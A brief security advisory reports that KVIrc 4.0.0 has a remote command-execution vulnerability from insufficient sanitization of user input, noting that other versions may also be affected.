KVIrc is prone to a remote command-execution vulnerability because the application fails to sufficiently sanitize user-supplied input.

Exploiting this issue can allow an attacker to execute arbitrary commands within the context of the affected application.

KVIrc 4.0.0 is vulnerable; other versions may also be affected.
